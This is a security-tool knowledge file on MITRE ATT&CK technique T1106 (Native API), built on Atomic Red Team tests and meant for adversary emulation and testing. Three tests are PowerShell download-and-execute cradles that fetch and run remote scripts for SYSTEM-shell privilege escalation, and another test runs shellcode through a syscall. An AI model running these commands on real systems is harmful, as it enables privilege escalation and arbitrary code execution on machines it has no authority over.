---
name: "T1106_native-api"
description: "Adversaries may interact with the native OS application programming interface (API) to execute behaviors."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1106
  - execution
  - linux
  - macos
  - windows
technique_id: "T1106"
tactic: "execution"
all_tactics:
  - execution
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1106"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-94
chains_with: []
prerequisites: []
severity_boost: {}
---

# T1106 Native API

## High-Level Description

Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.

Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.

Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.

Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.

## Kill Chain Phase

- Execution (TA0002)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Native API technique is applicable to target environment
- [ ] Check Linux systems for indicators of Native API
- [ ] Check macOS systems for indicators of Native API
- [ ] Check Windows systems for indicators of Native API
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Execution through API - CreateProcess

Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.

**Supported Platforms:** windows

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe "#{source_file}"
%tmp%/T1106.exe
```

**Dependencies:**

- #{source_file} must exist on system.

### Atomic Test 2: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique

Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
```

### Atomic Test 3: WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique

Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
```

### Atomic Test 4: WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique

Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
```

### Atomic Test 5: Run Shellcode via Syscall in Go

Runs shellcode in the current running process via a syscall.

Steps taken with this technique

1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
3. Change the memory page permissions to Execute/Read with VirtualProtect
4. Use syscall to execute the entrypoint of the shellcode

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)

**Supported Platforms:** windows

```powershell
$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Native API by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1106 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1038 Execution Prevention

Identify and block potentially malicious software executed that may be executed through this technique by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.

### M1040 Behavior Prevention on Endpoint

On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office VBA macros from calling Win32 APIs.

## Detection

### Behavioral Detection of Native API Invocation via Unusual DLL Loads and Direct Syscalls

## Risk Assessment

| Finding                         | Severity | Impact    |
| ------------------------------- | -------- | --------- |
| Native API technique applicable | Low      | Execution |

## CWE Categories

| CWE ID | Title                                  |
| ------ | -------------------------------------- |
| CWE-94 | Improper Control of Generation of Code |

## References

- [MACOS Cocoa](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1)
- [Apple Core Services](https://developer.apple.com/documentation/coreservices)
- [macOS Foundation](https://developer.apple.com/documentation/foundation)
- [OutFlank System Calls](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
- [Redops Syscalls](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls)
- [GNU Fork](https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html)
- [CyberBit System Calls](https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/)
- [GLIBC](https://www.gnu.org/software/libc/)
- [LIBC](https://man7.org/linux/man-pages//man7/libc.7.html)
- [Linux Kernel API](https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html)
- [MDSec System Calls](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)
- [Microsoft CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
- [Microsoft Win32](https://docs.microsoft.com/en-us/windows/win32/api/)
- [Microsoft NET](https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework)
- [NT API Windows](https://undocumented.ntinternals.net/)
- [Atomic Red Team - T1106](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1106)
- [MITRE ATT&CK - T1106](https://attack.mitre.org/techniques/T1106)
